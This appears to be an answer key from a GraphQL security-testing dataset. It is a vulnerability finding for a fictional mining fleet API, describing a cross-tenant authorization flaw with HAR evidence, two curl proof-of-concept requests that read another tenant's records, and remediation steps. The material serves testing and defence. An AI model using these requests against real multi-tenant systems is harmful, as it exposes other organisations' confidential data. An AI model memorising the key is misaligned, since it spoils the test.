# Expected Response

## System
- Domain: Mining / Fleet Management
- System: OreTrack Fleet Management
- Example ID: GQL-0075

## Priority Findings

### Finding 1: Cross-Service Identity Propagation Drift — Cross-Tenant Fleet Data Access (Pattern 1.10)
**Severity:** Critical
**Category:** BOLA / Cross-Service Identity Drift

**Summary:**
Per §5.0 (Pattern 1.10 — cross-service identity propagation drift): The resolver does not enforce tenantId from the JWT when the request passes through service boundaries. An attacker from `tenant-5015` supplied `tenantId: "tenant-38d9"` in `listResources` to access fleet asset records belonging to another mining operation. In cross-service scenarios, the downstream GraphQL resolver trusts a forwarded or client-supplied identity rather than re-validating the JWT-bound tenantId, enabling drift between the authenticated identity and the accessed data.

**Evidence from HAR:**
- Request: `POST https://api.oretrack-fleet-mana.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-5015`
- Query: `listResources(tenantId: "tenant-38d9") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-38d9"`, `ownerId: "other-user-501538d9"`, `sensitiveField: "CONFIDENTIAL-501538d9"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-501538d9`

**Root Cause (§4.0 RISK-GQL-075):** `getResource` / `listResources` resolver trusts client-supplied `tenantId`; cross-service token forwarding not re-validated.

## Steps to Reproduce

### Step 1 — Cross-service fleet record access (HAR)
```bash
curl -s -X POST https://api.oretrack-fleet-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5015" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-38d9\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-501538d9` from `tenant-38d9`. **Secure:** FORBIDDEN.

### Step 2 — Direct resource access across service boundary
```bash
curl -s -X POST https://api.oretrack-fleet-mana.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-5015" \
  -d '{"query": "query { getResource(id: \"R-2075\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Cross-service drift — JWT tenantId `tenant-5015` resolves data from `tenant-38d9`.

## Remediation
1. Always extract tenantId from validated JWT — never from client headers or query arguments.
2. Each service in the chain must re-validate the JWT and extract tenantId independently.
3. `listResources` must ignore client-supplied `tenantId` argument.
4. Resolver tenant guard: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
5. Redis cache key: `resource:{tenantId}:{resourceId}`.
